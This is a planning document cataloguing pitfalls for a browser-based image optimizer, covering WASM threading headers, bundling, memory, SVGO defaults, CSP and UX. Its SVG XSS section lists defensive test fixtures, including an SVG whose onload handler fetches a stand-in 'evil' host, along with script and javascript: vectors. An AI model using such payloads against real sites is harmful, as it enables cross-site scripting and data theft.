# Pitfalls Research

**Domain:** Browser-based image optimizer (WASM codecs + Web Worker pool + batch pipeline)
**Researched:** 2026-04-29
**Confidence:** HIGH

This document catalogs domain-specific failure modes for oimg.app. Each pitfall is mapped to a roadmap phase so prevention can be designed in, not retrofitted.

---

## Critical Pitfalls

### Pitfall 1: COOP/COEP misconfiguration silently disables WASM threading

**What goes wrong:**
WASM codecs (especially OxiPNG, libavif) advertise multi-threaded builds but silently fall back to single-thread when `crossOriginIsolated === false`. Result: 5–10x slower batch processing, no error, no warning. AVIF encode goes from ~500ms to ~3s per file.

**Why it happens:**
`SharedArrayBuffer` requires both `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Embedder-Policy: require-corp` (or `credentialless`). Vite dev server doesn't set these by default. Cloudflare Pages requires explicit `_headers` config. A single third-party `<script src>` or image without CORP breaks isolation page-wide.

**How to avoid:**
1. Set headers from day 1, both in dev and prod:
   - `vite.config.ts`: `server.headers = { 'Cross-Origin-Opener-Policy': 'same-origin', 'Cross-Origin-Embedder-Policy': 'require-corp' }`
   - Cloudflare Pages `_headers`:
     ```
     /*
       Cross-Origin-Opener-Policy: same-origin
       Cross-Origin-Embedder-Policy: require-corp
       Cross-Origin-Resource-Policy: same-origin
     ```
2. Add a runtime sentinel that asserts `globalThis.crossOriginIsolated === true` on app boot and logs to console (no telemetry — local only). Show a dev-only banner if false.
3. Avoid embedding any cross-origin assets without `crossorigin` attribute. Self-host fonts (Inter, JetBrains Mono).
4. Prefer `credentialless` on Pages if any cross-origin asset is unavoidable.

**Warning signs:**
- `typeof SharedArrayBuffer === 'undefined'` in console
- AVIF/OxiPNG encode times 3–10x expected
- DevTools → Application → Frames → top frame shows `crossOriginIsolated: false`

**Phase to address:**
**Phase 0 / scaffolding** — must be locked before any codec work.

---

### Pitfall 2: Vite WASM/Worker bundling works in dev but breaks in production

**What goes wrong:**
`new Worker('./worker.js')` resolves in `vite dev` (raw modules served) but fails in `vite build` (workers get hashed filenames, dynamic imports inside workers go to wrong paths). WASM files load with wrong MIME or 404 on Cloudflare Pages.

**Why it happens:**
Vite requires the canonical `new Worker(new URL('./worker.ts', import.meta.url), { type: 'module' })` pattern for static analysis. jSquash packages dynamically `import()` their `.wasm` siblings — these need Vite's `?url` or `?init` query suffixes, or bundling silently breaks the relative paths.

**How to avoid:**
1. **Always** use the URL+`import.meta.url` pattern for workers:
   ```ts
   new Worker(new URL('./codec-worker.ts', import.meta.url), { type: 'module' });
   ```
2. For jSquash, follow the package README's Vite recipe — typically `import init, { encode } from '@jsquash/avif/encode'` works because jSquash ships with an `init({ wasm: wasmUrl })` API. Pass an explicit URL:
   ```ts
   import wasmUrl from '@jsquash/avif/codec/enc/avif_enc.wasm?url';
   await init(undefined, { locateFile: () => wasmUrl });
   ```
3. Add `vite.config.ts → optimizeDeps.exclude: ['@jsquash/avif', '@jsquash/webp', ...]` so dev pre-bundling doesn't rewrite WASM URLs.
4. Add a CI smoke test: `vite build` then serve `dist/` and assert each codec encodes a 1x1 fixture.
5. Verify `_headers` covers `*.wasm` with `Content-Type: application/wasm` (Cloudflare auto-detects, but verify in CI).

**Warning signs:**
- "Failed to construct 'Worker'" in production console
- `wasm streaming compile failed: TypeError: Failed to fetch` on first encode
- 404 on hashed `*.wasm` URLs
- Works in `vite preview`, breaks on Pages — usually a `_headers` MIME issue

**Phase to address:**
**Phase 0 / scaffolding** (Vite + worker pattern) and **Phase 3 / raster pipeline** (jSquash integration).

---

### Pitfall 3: Memory blowup processing 50+ files (ImageData / Canvas / Blob accumulation)

**What goes wrong:**
Tab crashes or hits 4 GB limit at file 30–50. User sees "Aw, snap." The pipeline holds `ImageData`, intermediate `Canvas`, decoded `Blob`s, encoded `Uint8Array`s, and re-decoded preview thumbnails simultaneously. Each 4096×4096 PNG is 64 MB raw — 30 of those is 1.9 GB before any encode buffer.

**Why it happens:**
- React state holds raw decoded `ImageData` for previews
- Worker pool keeps results in memory until `await Promise.all(...)` resolves
- jSquash codecs allocate WASM heap that must be explicitly freed
- `URL.createObjectURL` results not revoked

**How to avoid:**
1. **Streaming pipeline**: process files in N-at-a-time chunks (concurrency = `navigator.hardwareConcurrency` capped at 4), not `Promise.all(allFiles)`.
2. **Never hold raw ImageData in React state.** Store only `{ id, sourceBlob, resultBlob, sizeBefore, sizeAfter, thumbnailBlob }`. Decode on demand.
3. **Thumbnails**: generate a 256px `Blob` thumbnail in worker, transfer back, discard the full ImageData. Use `createImageBitmap` + `OffscreenCanvas` in worker for downscale.
4. **Revoke object URLs**: every `URL.createObjectURL` paired with `URL.revokeObjectURL` in a `useEffect` cleanup.
5. **Free WASM modules**: jSquash exposes module instances — destroy/reset between batches if memory pressure detected via `performance.memory.usedJSHeapSize` (Chrome only, best-effort).
6. **Transferables**: postMessage `ArrayBuffer` with `[buffer]` transfer list — never structured-clone large buffers.

**Warning signs:**
- Tab memory > 1.5 GB in DevTools → Performance → Memory
- "Allocation failed" in worker console
- Frame drops during batch
- iOS Safari kills the tab silently after ~30 files

**Phase to address:**
**Phase 4 / batch pipeline** — design memory model before implementing pool.

---

### Pitfall 4: SVGO `removeViewBox` enabled by default breaks responsive SVG

**What goes wrong:**
User uploads logo SVG, optimized output renders as 16x16 fixed-size sliver instead of scaling to its CSS container. Looks fine in oimg.app preview (because SVGOMG sets explicit width/height) but breaks when pasted into a real site that relies on `viewBox` for responsive scaling.

**Why it happens:**
`svgo` `preset-default` includes `removeViewBox: true` (this is upstream's choice — SVGO assumes you have width/height). The plugin only no-ops when both `width` and `height` are present *as attributes*, not via CSS. Any SVG without explicit `width="x"`/`height="y"` attrs loses its viewBox and stops scaling.

**How to avoid:**
Override in default config:
```ts
const svgoConfig = {
  multipass: true,
  plugins: [
    {
      name: 'preset-default',
      params: { overrides: { removeViewBox: false } },
    },
    'removeDimensions', // strip width/height instead, keep viewBox
  ],
};
```
Surface this as a default-on toggle in the UI, with a tooltip explaining the tradeoff. Match SVGOMG's UX which also overrides this.

**Warning signs:**
- User reports "SVG renders tiny on my site"
- Diff view shows `viewBox` stripped from output
- Pasted SVG renders at intrinsic size only

**Phase to address:**
**Phase 2 / SVG pipeline** — encode the override into the default `SvgoConfig`.

---

### Pitfall 5: SVG XSS — optimized SVG is not sanitized SVG

**What goes wrong:**
User pastes an SVG containing inline scripts, `onload="..."`, `href="javascript:..."`, or `<foreignObject><iframe>`. SVGO does NOT remove these by default — it's an optimizer, not a sanitizer. If oimg.app renders the result inline (preview, snippet panel, "inline SVG" output), it executes as same-origin JS — full XSS, including reading IndexedDB presets and exfiltrating to attacker via cross-fetch.

**Why it happens:**
SVGO's threat model is "trusted input from designers." oimg.app's threat model is "untrusted file from anywhere on disk." `preset-default` keeps event handlers because they may be intentional (animation triggers).

**How to avoid:**
1. Run **DOMPurify** with `USE_PROFILES: { svg: true, svgFilters: true }` on every SVG **before** SVGO and again on inline-render.
2. Render previews via `<img src="blob:...">` (parses but sandboxed — script doesn't execute) instead of inline SVG injection. Inline only when user explicitly opens "Inline SVG" snippet panel, and re-sanitize at that point.
3. Strip script tags, all `on*` attrs, `xlink:href` starting with `javascript:`, and `<foreignObject>` (or sanitize its contents).
4. CSP headers in `_headers`:
   ```
   Content-Security-Policy: default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; img-src 'self' blob: data:; style-src 'self' 'unsafe-inline'; connect-src 'self' blob:; worker-src 'self' blob:
   ```
   Note: `wasm-unsafe-eval` is required for jSquash WASM compilation.

**Warning signs:**
- Test fixture: SVG with inline `alert(1)` script triggers alert in preview
- Test fixture: SVG with `onload="fetch('//evil')"` shows in Network tab

**Phase to address:**
**Phase 2 / SVG pipeline** — sanitize before optimize, and again before inline render.

---

### Pitfall 6: example-ui port — UMD React + ESM React = "Invalid hook call"

**What goes wrong:**
During the `example-ui/` to Vite migration, two React instances coexist (UMD `<script>` from old code paths and ESM React from `node_modules`). Hooks called against the wrong instance throw "Invalid hook call. Hooks can only be called inside the body of a function component." — *intermittently*, depending on import order.

**Why it happens:**
React stores the current dispatcher on a singleton. UMD React 19 and ESM React 19 are *different* singletons even though they're the same version. Any component imported from a UMD-built path uses the UMD dispatcher; the ESM tree uses the ESM dispatcher.

**How to avoid:**
1. **Hard cutover**, not gradual: in the migration phase, rip out all `<script src="react.umd.js">` references in one commit. Don't run hybrid.
2. After cutover, add `vite.config.ts → resolve.dedupe = ['react', 'react-dom']` to enforce single instance.
3. CI check: `npm ls react` returns exactly one version.
4. Add a runtime assert in dev that captures `import * as React from 'react'` once and throws if two instances are observed on `window.__REACT_INSTANCE`.
5. Move `OIMG.html` design tokens to a CSS file (`tokens.css`) imported once at app root — don't keep inline `<style>` in the migrated HTML.

**Warning signs:**
- "Invalid hook call" only on certain components
- Two `react.development.js` entries in DevTools → Sources
- React DevTools shows two roots

**Phase to address:**
**Phase 1 / UI migration** — design migration as atomic commit, not file-by-file port.

---

### Pitfall 7: First paint blocked by WASM init

**What goes wrong:**
User lands on oimg.app. Blank screen for 1–3 seconds while ~5 WASM codecs compile in parallel. Lighthouse FCP > 2s, LCP > 3s. Even worse on mid-tier mobile (2–5s).

**Why it happens:**
Naive `import '@jsquash/avif'` at app entry triggers eager WASM streaming compile. Each codec is 200–800 KB compressed. Even with `instantiateStreaming`, the main thread is busy.

**How to avoid:**
1. **Never import codecs at app entry.** Import only when the user has a file of that type *and* clicks optimize (or hovers — prefetch hint).
2. Use dynamic `import()` per codec, behind the worker boundary:
   ```ts
   // in worker
   const { encode } = await import('@jsquash/avif/encode');
   ```
3. Show shell UI (drop zone, header, settings panel skeleton) before any codec loads — target FCP < 800 ms.
4. On `dragenter` of a file, sniff format from extension/magic bytes and *prefetch* the relevant codec (`<link rel="modulepreload">` injected dynamically).
5. Lazy-load SVGO too — its ESM bundle is ~150 KB.

**Warning signs:**
- Lighthouse FCP > 1.5s on desktop
- Bundle analyzer shows `*.wasm` in initial chunk
- Network tab: 5 WASM files load before any UI paints

**Phase to address:**
**Phase 0 / scaffolding** (lazy-load architecture) verified in **Phase 6 / perf pass**.

---

## Moderate Pitfalls

### Pitfall 8: Worker pool race conditions with N-variants-per-file

**What goes wrong:**
User sets "generate 1x/2x/3x AVIF + WebP + PNG" — one source file fans out to 9 encode jobs. Pool dispatches them across workers. If user changes settings mid-batch, results from old settings arrive *after* new jobs queued — UI shows mismatched output.

**Why it happens:**
No job-generation token. Worker results are matched by file ID, but settings version isn't tracked.

**How to avoid:**
- Each job carries `{ fileId, variantId, settingsVersion }`.
- Bump `settingsVersion` on every settings change.
- Discard worker results where `result.settingsVersion < currentSettingsVersion` for that file.
- Show "Settings changed — reprocessing" banner with cancel button.

**Phase to address:** **Phase 4 / batch pipeline.**

---

### Pitfall 9: PNG quantization (libimagequant) destroys gradients

**What goes wrong:**
User enables PNG quantization for a screenshot containing UI gradients/shadows — output has visible banding. User assumes oimg.app is buggy.

**Why it happens:**
libimagequant defaults to 256 colors; gradients need thousands of unique colors.

**How to avoid:**
- Quantization is **opt-in**, not on by default.
- UI label: "Quantize to 256-color palette (best for icons/logos, breaks gradients)".
- Auto-detect heuristic: if source has > 50K unique colors, show warning before applying.

**Phase to address:** **Phase 3 / raster pipeline.**

---

### Pitfall 10: AVIF encode is slow — UI must surface progress

**What goes wrong:**
AVIF encode takes 500 ms – 2 s per file at default speed. Without progress UI, user clicks "Optimize," sees nothing for 10 seconds on a batch, assumes app is frozen, refreshes.

**Why it happens:**
libavif `speed=6` is quality-favoring default; users don't know to lower it.

**How to avoid:**
- Per-file progress in batch list with explicit "Encoding AVIF…" state.
- Default `speed=6` for AVIF (mid quality/speed). Expose 0–10 slider with explanation.
- For files < 50 KB, encode fast (`speed=8`) — diminishing returns.
- Show ETA based on file count × measured per-file time.

**Phase to address:** **Phase 4 / batch pipeline + progress UI.**

---

### Pitfall 11: `<picture>` source ordering matters

**What goes wrong:**
Snippet generates `<picture>` with `<source type="image/webp">` *before* `<source type="image/avif">`. Browsers pick the first match they support — Chrome supports both, picks WebP, AVIF never used.

**Why it happens:**
Naive insertion order = order of UI checkboxes.

**How to avoid:**
- Hardcoded format priority: AVIF → WebP → JPEG/PNG fallback.
- Snippet generator function takes a `Set<Format>` and emits in fixed order, not user toggle order.
- Unit test: assert AVIF source always before WebP in generated HTML.

**Phase to address:** **Phase 5 / snippet generation.**

---

### Pitfall 12: Inline SVG ID collision

**What goes wrong:**
User embeds two inline SVGs with `<defs><linearGradient id="grad1">`. Second SVG's gradient references first SVG's def (same ID, same document) — visual breaks subtly.

**Why it happens:**
SVGO's `cleanupIds` minifies but doesn't scope. IDs become `a`, `b`, `c` — guaranteed collisions across SVGs.

**How to avoid:**
- For inline-SVG snippet output, prefix all IDs with a per-file unique slug: `oimg-${nanoid(6)}-`.
- Run a post-SVGO pass that walks DOM, finds `id=` attrs and `url(#...)` / `href="#..."` refs, prefixes both.
- Document caveat in snippet panel.

**Phase to address:** **Phase 5 / snippet generation.**

---

### Pitfall 13: SVG data URI — Base64 vs URL-encoded size

**What goes wrong:**
Generates Base64 data URI for SVG by default — output is 33% larger than URL-encoded equivalent. SVGs are text; URL-encoding is dramatically smaller.

**Why it happens:**
Devs reach for Base64 because they're used to it for raster.

**How to avoid:**
- Default to URL-encoded for SVG (`encodeURIComponent` then escape `'`, `"`, `<`, `>`, `#`, `%`).
- Show both options with size comparison ("URL-encoded: 1.2 KB | Base64: 1.6 KB").
- Document the 32 KB rule-of-thumb (HTTP/1.1 cache benefit threshold) but don't hard-block — show a warning, let the user decide.

**Phase to address:** **Phase 5 / snippet generation.**

---

### Pitfall 14: SVGO `convertShapeToPath` + `mergePaths` breaks stroked SVGs

**What goes wrong:**
Multi-stroke icon with different stroke widths gets merged into one path — all strokes inherit one width — visual breaks.

**Why it happens:**
`mergePaths` assumes uniform stroke. Aggressive defaults from preset-default can hit edge cases.

**How to avoid:**
- Disable `mergePaths` by default, expose as opt-in toggle with warning.
- A/B render before/after via Canvas + pixel diff — if diff > 1%, surface a "changed visually" badge.
- Reference: SVGOMG enables this only with explicit user action.

**Phase to address:** **Phase 2 / SVG pipeline.**

---

### Pitfall 15: User pastes screenshot with PII — must signal local processing

**What goes wrong:**
User uploads screenshot containing API keys, customer data, etc. Even though processing is local, lack of visible signal means user feels "it's a website, my data left my machine."

**Why it happens:**
Trust is earned visually, not by README claims.

**How to avoid:**
- Persistent badge in header: "100% local — Network: 0 requests" with live counter.
- Hook `fetch` and `XMLHttpRequest` in dev to assert no outbound calls after WASM load.
- After WASM init, no codec should make network calls — verify in CI with `Network.requestWillBeSent` recording.

**Phase to address:**
**Phase 0 / scaffolding** (CSP, network sentinel) and **Phase 1 / UI** (badge).

---

## Minor Pitfalls

### Pitfall 16: MozJPEG progressive default differs from native JPEG

**What goes wrong:**
MozJPEG defaults to progressive — re-encoded JPEGs differ binary-wise from "native" baseline. Confuses users doing byte-diffs.
**Avoid:** Document default; expose toggle; favor progressive (smaller for files > 10 KB).
**Phase:** Phase 3.

### Pitfall 17: WebP encoder defaults differ between lossy/lossless

**What goes wrong:**
Lossy WebP defaults to quality=75, method=4. Lossless ignores quality, uses level 6. Single quality slider misleads in lossless mode.
**Avoid:** Show different controls per mode; don't share state.
**Phase:** Phase 3.

### Pitfall 18: Cloudflare Pages 25 MB asset limit

**What goes wrong:**
Largest WASM (libavif full) approaches 2–3 MB compressed but unbounded raw. Bundling all codecs into one chunk could hit limits.
**Avoid:** Per-codec chunk; CI check `find dist -size +20M`.
**Phase:** Phase 0.

### Pitfall 19: Optimization "done" too fast feels broken

**What goes wrong:**
SVG optimize on a 2 KB icon takes 5 ms. UI flickers. User wonders if anything happened.
**Avoid:** Minimum 250 ms display delay with progress animation; show "X% saved" badge prominently.
**Phase:** Phase 4 / progress UI.

### Pitfall 20: IndexedDB schema migrations (deferred PWA work)

**What goes wrong:**
Adding fields to preset schema breaks users with old data.
**Avoid:** From day 1, every IDB write goes through a versioned `upgrade(db, oldVersion, newVersion)` callback. Use `idb` (Jake Archibald's wrapper) — battle-tested.
**Phase:** Phase 4 (preset persistence).

### Pitfall 21: Safari OffscreenCanvas + COOP/COEP edge cases

**What goes wrong:**
Safari only shipped OffscreenCanvas widely in 2023 (Safari 16.4). Older iOS users get errors. Some Safari versions have COOP/COEP regressions.
**Avoid:** Feature-detect `typeof OffscreenCanvas !== 'undefined'` — fall back to main-thread Canvas (slower, single-thread). Show "Use Chrome/Firefox for best performance" hint if fallback engaged. Test on iOS Safari 16, 17, 18.
**Phase:** Phase 6 / cross-browser.

### Pitfall 22: Firefox WASM threading parity

**What goes wrong:**
Firefox WASM threading historically lagged Chrome. Some atomics behave differently. Edge cases in OxiPNG multi-threaded compress.
**Avoid:** Test full batch pipeline in Firefox in CI (Playwright). If thread bugs surface, force single-threaded build for Firefox via UA sniff (last resort).
**Phase:** Phase 6 / cross-browser.

### Pitfall 23: Telemetry from npm deps

**What goes wrong:**
Some packages (`@sentry/*` autoinit, certain analytics libs) phone home on import. A transitive dep could leak.
**Avoid:**
- CI step: build prod, serve, load with throttled offline-after-WASM, assert zero network requests.
- Audit `npm ls` for known telemetry packages.
- Lock CSP `connect-src 'self'` — any external request fails visibly.
**Phase:** Phase 0 / scaffolding (CSP), Phase 6 / pre-release audit.

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Single global Web Worker (no pool) | Simple v0 | Serializes batch — one slow AVIF blocks everything | Phase 0 prototype only; never in MVP |
| Eager-import all jSquash codecs | One import line | Initial bundle 2–5 MB, FCP > 3s | Never |
| Inline raw `ImageData` in React state | Easy preview rendering | OOM at file 30+ | Never |
| Skip DOMPurify, "users won't upload bad SVG" | Faster ship | XSS the day someone shares a link with `?import=` URL | Never |
| Hardcode default settings, no IndexedDB presets | Phase 4 ships earlier | Users re-configure every session, churn | OK for MVP/v0.1 if presets phase planned |
| `Promise.all(allFiles)` in batch | Simple code | Memory blowup at scale | Never with > 10 files |
| Trust SVGO output without round-trip render check | Less complexity | Silent visual breaks | OK if "aggressive" toggles default off |
| Skip `_headers` COOP/COEP, "we'll add later" | Faster local dev | 5–10x slower codecs in prod, hard to diagnose | Never — set day one |

---

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| **jSquash codecs** | Calling encode without `await init()` | Each codec exports its own `init()` — call once per worker boot, pass explicit WASM URL |
| **SVGO browser bundle** | Importing from `svgo` resolves to Node entry | Use `svgo/dist/svgo.browser.js` or v3+ ESM entry; verify via `vite build` analyzer |
| **JSZip** | `generateAsync` with `{ streamFiles: true }` returns `ReadableStream` | For `<a download>`, you want `Blob` — use `{ type: 'blob', compression: 'DEFLATE', compressionOptions: { level: 6 } }` |
| **DOMPurify** | Using default profile on SVG strips legitimate elements | `USE_PROFILES: { svg: true, svgFilters: true }` plus custom `ADD_TAGS` if you want `<foreignObject>` (you probably don't) |
| **idb (IndexedDB wrapper)** | Forgetting `upgrade()` callback — schema diverges across users | Always pass `upgrade(db, oldVersion)` even if v1 |
| **Cloudflare Pages `_headers`** | Wildcard rules silently broken by leading whitespace | Validate locally with `wrangler pages dev --headers` before deploy |
| **Vite `?url` vs `?init`** | Mixing them on WASM imports | `?url` returns string URL; `?init` returns `(opts) => Promise<WebAssembly.Instance>`. Use `?url` + `locateFile` for jSquash compatibility |

---

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Eager codec import | FCP > 1.5s, large initial bundle | Dynamic `import()` per format, behind worker | First load, every user |
| Synchronous Canvas decode on main thread | UI freezes during file drop | `createImageBitmap` in worker | Files > 5 MB or batches > 10 |
| Structured-clone large buffers via postMessage | Doubled memory + frame drops | `postMessage(buf, [buf])` transfer | Files > 1 MB |
| Single shared worker for all codecs | Batch is serialized | Pool of N = `min(hardwareConcurrency, 4)` | Batches > 5 files |
| Holding decoded `ImageData` in React state | OOM | Store `Blob` only, decode on demand | Batches > 30 files |
| Re-rendering file list on every progress tick | 60→15 fps during batch | Throttle progress updates to 200 ms; virtualize list (react-virtual) | Batches > 50 files |
| Generating thumbnails on main thread | Drop zone laggy | `OffscreenCanvas` + `createImageBitmap` in worker | Any batch |
| Not revoking object URLs | Slow memory leak | `URL.revokeObjectURL` in `useEffect` cleanup | Sessions > 100 files |
| Missing COOP/COEP | OxiPNG/AVIF 5–10x slower | Headers from day 1 | Always |

---

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Inline SVG without sanitization | Same-origin XSS — read IndexedDB, exfil | DOMPurify before AND after SVGO; render previews via `<img src=blob:>` |
| Loose CSP allows external `connect-src` | Telemetry slip-through | `connect-src 'self'` lockdown; CI assertion |
| Raw HTML injection for SVG snippet preview | XSS | Use `<img>` with blob URL, or sanitize-then-DOMParser-then-clone (avoid React's raw-HTML escape hatch) |
| Trusting file extension for format | Wrong codec invoked, possible parser bugs | Sniff magic bytes (PNG `89 50 4E 47`, JPEG `FF D8 FF`, etc.) |
| Including `unsafe-eval` in CSP | Defeats CSP purpose | Only `wasm-unsafe-eval` (required for jSquash); never `unsafe-eval` |
| Persisting file thumbnails in IndexedDB | PII leak across sessions on shared machines | No file/thumbnail persistence — explicit privacy promise |
| External fonts from CDN | Breaks COEP, leaks user IP | Self-host Inter, JetBrains Mono in `/public/fonts` |
| Allowing `<foreignObject>` through sanitizer | Embedded HTML/JS execution | Strip `<foreignObject>` entirely in DOMPurify config |

---

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| No progress for slow AVIF encodes | "App is frozen, refresh" | Per-file progress states + ETA |
| Settings change mid-batch silently reprocesses | Confusion about which result is "current" | Banner "Settings changed — reprocessing" with explicit Apply / Cancel |
| Optimization "done" instantly | Feels broken on small files | Min 250 ms animation; prominently show "X% saved" |
| No visible privacy signal | "Did my file just upload?" | Persistent "100% local — 0 network requests" badge |
| Snippet copy without confirmation | "Did it copy?" | Toast "Copied 1.2 KB to clipboard" |
| Single quality slider for lossy + lossless WebP | Lossless ignores it, confusing | Mode-specific controls; hide quality in lossless |
| `removeViewBox` on by default | Output breaks in user's site | Override default; surface as toggle |
| No before/after size delta | "Did anything happen?" | File row shows `5.2 KB → 1.1 KB (−79%)` always |
| Quantize PNG by default | Banding on screenshots | Opt-in only, with auto-detect warning |
| Generic error for codec failure | "Something went wrong" | Format-specific: "AVIF encode failed — try lower quality or resize first" |

---

## "Looks Done But Isn't" Checklist

- [ ] **WASM threading**: Verify `crossOriginIsolated === true` in deployed app, not just localhost
- [ ] **Codec lazy-loading**: Bundle analyzer shows zero `*.wasm` in initial chunk
- [ ] **SVGO viewBox**: Test fixture without explicit width/height — output keeps `viewBox`
- [ ] **SVG sanitization**: Test fixture with embedded script — no alert fires anywhere in pipeline
- [ ] **Memory**: Process 100-file batch, peak heap < 1 GB
- [ ] **AVIF before WebP**: Generated `<picture>` always orders AVIF first
- [ ] **Network sentinel**: Production bundle, throttle to offline after WASM load — pipeline still works, no failed requests
- [ ] **Single React instance**: `npm ls react` shows exactly one version; no "Invalid hook call" in any flow
- [ ] **Inline SVG ID scoping**: Embed two inline SVGs side-by-side, no visual interference
- [ ] **Object URL revocation**: Process batch, then check `performance.memory` — no growth after batch completes
- [ ] **Progress UI on slow codecs**: AVIF batch of 20 large files shows continuous progress, never appears frozen
- [ ] **Cross-browser smoke**: Full batch pipeline works in Chrome, Firefox, Safari 17+
- [ ] **CSP**: `connect-src 'self'`; verified by attempting outbound fetch (should fail)
- [ ] **OOM resistance**: 50x 4K PNG batch on 8 GB machine — completes or errors gracefully, no tab crash
- [ ] **Cloudflare `_headers` deployed**: Curl response headers in prod — COOP/COEP present
- [ ] **Service worker (when added)**: Doesn't strip COOP/COEP from cached responses

---

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| COOP/COEP missing | LOW | Add `_headers` and Vite `server.headers`, redeploy. No code changes needed. |
| WASM 404 in prod | LOW–MEDIUM | Audit `vite.config.ts` worker/WASM imports; switch to `?url` pattern; rebuild |
| Memory blowup discovered post-launch | HIGH | Refactor batch pipeline to streaming; rewrite state model — touches batch + UI layers |
| Multiple React instances | MEDIUM | Add `dedupe`, complete UMD removal; usually one PR but may surface latent bugs |
| SVG XSS report | HIGH (urgent) | Add DOMPurify immediately; rotate domain if exfil suspected; postmortem |
| Codec returns wrong output | MEDIUM | Pin jSquash version; add fixture-based regression tests |
| User reports broken responsive SVG | LOW | Override `removeViewBox`; ship hotfix; clear cached presets |
| Telemetry slip from new dep | MEDIUM | Pin CSP `connect-src 'self'`; audit dep; remove or replace; communicate transparently |
| Tab crash on iOS Safari | MEDIUM | Cap batch concurrency lower for Safari (UA detect); add explicit memory warnings |
| Worker pool deadlock | MEDIUM | Add per-job timeout (30s); kill+respawn worker on timeout; surface as user-facing error |

---

## Pitfall-to-Phase Mapping

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| 1. COOP/COEP misconfig | Phase 0 / scaffolding | `crossOriginIsolated === true` assertion in CI smoke test |
| 2. Vite WASM/Worker bundling | Phase 0 + Phase 3 | `vite build` + serve `dist/` smoke test encodes 1x1 fixture per codec |
| 3. Memory blowup | Phase 4 / batch pipeline | 100-file stress test, peak heap < 1 GB |
| 4. SVGO `removeViewBox` | Phase 2 / SVG pipeline | Fixture without width/height attrs — output retains `viewBox` |
| 5. SVG XSS | Phase 2 | XSS fixture suite (script, onload, javascript:) — none execute |
| 6. React instance dupes | Phase 1 / UI migration | `npm ls react` single version + dev runtime assert |
| 7. WASM init blocks FCP | Phase 0 (architecture) + Phase 6 (perf pass) | Lighthouse FCP < 1s on throttled network |
| 8. Worker pool race | Phase 4 | Mid-batch settings change test — only fresh results shown |
| 9. PNG quantization defaults | Phase 3 / raster | Quantize OFF by default; opt-in toggle present |
| 10. AVIF slow + no progress | Phase 4 (UI) + Phase 3 (codec) | Visual: batch of 20 AVIF files shows ongoing progress |
| 11. `<picture>` source order | Phase 5 / snippets | Unit test: AVIF source always before WebP |
| 12. Inline SVG ID collision | Phase 5 / snippets | Two-SVG embed test, no cross-ref |
| 13. Base64 vs URL-encoded SVG | Phase 5 / snippets | Default URL-encoded; size comparison shown |
| 14. SVGO mergePaths breakage | Phase 2 | Stroked-paths fixture; mergePaths off by default |
| 15. Privacy signal | Phase 0 (CSP) + Phase 1 (badge) | "0 network requests" indicator visible |
| 16. MozJPEG progressive | Phase 3 | Doc + toggle present |
| 17. WebP lossy/lossless controls | Phase 3 | Mode-specific UI controls, not shared slider |
| 18. Cloudflare 25 MB asset | Phase 0 / build | CI: `find dist -size +20M` returns empty |
| 19. "Done too fast" UX | Phase 4 / progress UI | Min animation duration verified |
| 20. IndexedDB migrations | Phase 4 (presets) | `idb` wrapper used with explicit `upgrade()` |
| 21. Safari OffscreenCanvas fallback | Phase 6 / cross-browser | Playwright test on Safari 16+ |
| 22. Firefox WASM threading | Phase 6 / cross-browser | Playwright batch test in Firefox |
| 23. Telemetry from npm deps | Phase 0 (CSP) + Phase 6 (audit) | Network trace post-WASM-load: zero requests |

---

## Sources

- jSquash README and Vite integration recipes — `https://github.com/jamsinclair/jSquash`
- SVGO `preset-default` plugin documentation, `removeViewBox` plugin source — `https://github.com/svg/svgo`
- MDN: `Cross-Origin-Opener-Policy` / `Cross-Origin-Embedder-Policy` / `crossOriginIsolated`
- Vite docs: Web Workers (`new Worker(new URL(...), { type: 'module' })`), `?url` / `?init` import suffixes, `optimizeDeps.exclude`
- DOMPurify `USE_PROFILES.svg` option documentation
- Cloudflare Pages `_headers` syntax + 25 MB asset limit reference
- React DevTools "Invalid hook call" troubleshooting (multiple React instances)
- WebKit / Safari OffscreenCanvas shipping timeline (Safari 16.4, 2023)
- SVGOMG source — empirical UX defaults for SVGO plugin presentation
- Squoosh source — Web Worker pool and AVIF speed parameter UX
- `inspired/squoosh/`, `inspired/svgomg/`, `inspired/url-encoder/` — local reference repos
- Project context: `.planning/PROJECT.md`, `ARCH.md` (section 7), `ARCH_.md` (sections 4, 6)

Confidence notes:
- HIGH for COOP/COEP, Vite WASM/Worker patterns, React instance duplication, SVGO `removeViewBox`, SVG XSS — verified against current docs and well-known issues.
- MEDIUM for AVIF encode timings (varies by file/CPU) and Cloudflare 25 MB limit specifics (verify against current Pages docs at deploy time).
- LOW for Firefox-specific WASM threading regressions — historically real, but parity has improved; verify empirically in Phase 6.

---
*Pitfalls research for: oimg.app — browser-based image optimizer*
*Researched: 2026-04-29*
